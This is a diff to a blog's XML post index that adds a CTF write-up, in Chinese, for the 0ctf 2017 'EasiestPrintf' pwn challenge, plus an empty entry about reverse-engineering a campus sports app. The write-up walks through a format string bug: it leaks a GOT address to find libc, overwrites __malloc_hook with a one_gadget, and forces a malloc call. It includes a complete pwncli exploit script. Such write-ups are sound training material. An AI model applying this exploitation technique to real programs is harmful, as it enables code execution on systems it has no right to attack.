@@ -4,6 +4,52 @@
   
   
   <entry>
+    <title>浙理体育逆向分析</title>
+    <link href="/2022/12/07/%E6%B5%99%E7%90%86%E4%BD%93%E8%82%B2%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
+    <url>/2022/12/07/%E6%B5%99%E7%90%86%E4%BD%93%E8%82%B2%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>0ctf_2017_EasiestPrintf</title>
+    <link href="/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/"/>
+    <url>/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/</url>
+    
+    <content type="html"><![CDATA[<h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p><img src="/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/1.png"></p><ul><li>没开PIE</li></ul><p><img src="/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/2.png"></p><ul><li>可以leak任意地址指向的数据</li></ul><p><img src="/2022/12/07/buuCTF-pwn-0ctf-2017-EasiestPrintf/3.png"></p><ul><li>存在格式化字符串漏洞</li></ul><h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><ul><li>首先leak got表指向的libc函数地址</li><li>利用格式字符串漏洞修改__malloc_hook位one_gadget</li><li>通过printf打印超过65536个字符来调用malloc</li></ul><h1 id="0x03-Exp"><a href="#0x03-Exp" class="headerlink" title="0x03 Exp"></a>0x03 Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-07 16:57:38</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br>libc=ELF(<span class="hljs-string">&quot;../libc/libc-2.23_32.so&quot;</span>)<br><br><span class="hljs-comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span><br>CurrentGadgets.set_find_area(find_in_elf=<span class="hljs-literal">True</span>, find_in_libc=<span class="hljs-literal">False</span>, do_initial=<span class="hljs-literal">False</span>)<br><br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>exit_got=elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>rl()<br>sl(<span class="hljs-built_in">str</span>(read_got))<br>read_addr=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br>base=read_addr-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mh=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one=base+<span class="hljs-number">0x3a812</span><br>ru(<span class="hljs-string">&quot;Good Bye&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(one))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(mh))<br>p=fmtstr_payload(<span class="hljs-number">7</span>,&#123;mh:one&#125;)+<span class="hljs-string">b&quot;%65599c&quot;</span><br>sl(p)<br>stop()<br>ia()<br></code></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><ul><li>printf打印超过65536个字符时，内部会调用malloc</li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>Pwn</category>
+      
+      <category>WP</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>BUU</tag>
+      
+      <tag>PWN</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>SayNOW</title>
     <link href="/2022/11/29/SayNOW/"/>
     <url>/2022/11/29/SayNOW/</url>
